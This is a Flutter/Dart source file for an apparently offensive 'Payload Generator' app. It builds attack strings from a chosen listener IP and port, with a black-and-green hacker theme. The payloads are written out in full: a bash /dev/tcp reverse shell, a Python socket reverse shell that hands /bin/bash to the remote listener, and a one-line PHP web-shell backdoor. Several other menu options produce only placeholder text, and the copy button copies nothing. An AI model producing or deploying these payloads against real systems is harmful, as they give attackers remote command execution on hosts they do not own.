import 'package:flutter/material.dart';

class PayloadGenerator extends StatefulWidget {
  const PayloadGenerator({super.key});

  @override
  State<PayloadGenerator> createState() => _PayloadGeneratorState();
}

class _PayloadGeneratorState extends State<PayloadGenerator> {
  String _selectedPayload = 'Reverse Shell';
  String _lhost = '192.168.1.100';
  String _lport = '4444';
  String _generatedPayload = '';

  final List<String> _payloadTypes = [
    'Reverse Shell',
    'Bind Shell',
    'Meterpreter',
    'Web Shell',
    'PHP Backdoor',
    'Python Reverse Shell',
  ];

  void _generatePayload() {
    switch (_selectedPayload) {
      case 'Reverse Shell':
        _generatedPayload = 'bash -i >& /dev/tcp/$_lhost/$_lport 0>&1';
        break;
      case 'Python Reverse Shell':
        _generatedPayload = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'$_lhost\',$_lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"';
        break;
      case 'PHP Backdoor':
        _generatedPayload = '<?php system(\$_GET["cmd"]); ?>';
        break;
      default:
        _generatedPayload = 'payload generated for $_selectedPayload';
    }
    setState(() {});
  }

  void _copyToClipboard() {
    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('Payload copied to clipboard')),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        title: const Text('Payload Generator'),
        backgroundColor: Colors.green.shade900,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            _buildPayloadSelector(),
            const SizedBox(height: 16),
            _buildNetworkConfig(),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: _generatePayload,
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.green,
                minimumSize: const Size(double.infinity, 50),
              ),
              child: const Text('GENERATE PAYLOAD'),
            ),
            const SizedBox(height: 20),
            if (_generatedPayload.isNotEmpty) _buildPayloadOutput(),
          ],
        ),
      ),
    );
  }

  Widget _buildPayloadSelector() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.grey.shade900,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text('Payload Type', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
          const SizedBox(height: 8),
          DropdownButtonFormField<String>(
            value: _selectedPayload,
            items: _payloadTypes.map((type) => DropdownMenuItem(value: type, child: Text(type))).toList(),
            onChanged: (v) => setState(() => _selectedPayload = v!),
            decoration: const InputDecoration(
              border: OutlineInputBorder(),
              filled: true,
              fillColor: Colors.black,
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildNetworkConfig() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.grey.shade900,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Column(
        children: [
          TextField(
            style: const TextStyle(color: Colors.white),
            decoration: const InputDecoration(
              labelText: 'LHOST (Listener IP)',
              labelStyle: TextStyle(color: Colors.green),
              border: OutlineInputBorder(),
            ),
            onChanged: (v) => _lhost = v,
          ),
          const SizedBox(height: 12),
          TextField(
            style: const TextStyle(color: Colors.white),
            decoration: const InputDecoration(
              labelText: 'LPORT (Listener Port)',
              labelStyle: TextStyle(color: Colors.green),
              border: OutlineInputBorder(),
            ),
            keyboardType: TextInputType.number,
            onChanged: (v) => _lport = v,
          ),
        ],
      ),
    );
  }

  Widget _buildPayloadOutput() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.grey.shade900,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.green),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.code, color: Colors.green),
              SizedBox(width: 8),
              Text('Generated Payload', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 12),
          Container(
            padding: const EdgeInsets.all(12),
            color: Colors.black,
            child: SelectableText(
              _generatedPayload,
              style: const TextStyle(color: Colors.green, fontFamily: 'monospace'),
            ),
          ),
          const SizedBox(height: 12),
          ElevatedButton.icon(
            onPressed: _copyToClipboard,
            icon: const Icon(Icons.copy),
            label: const Text('Copy to Clipboard'),
            style: ElevatedButton.styleFrom(backgroundColor: Colors.green),
          ),
        ],
      ),
    );
  }
}
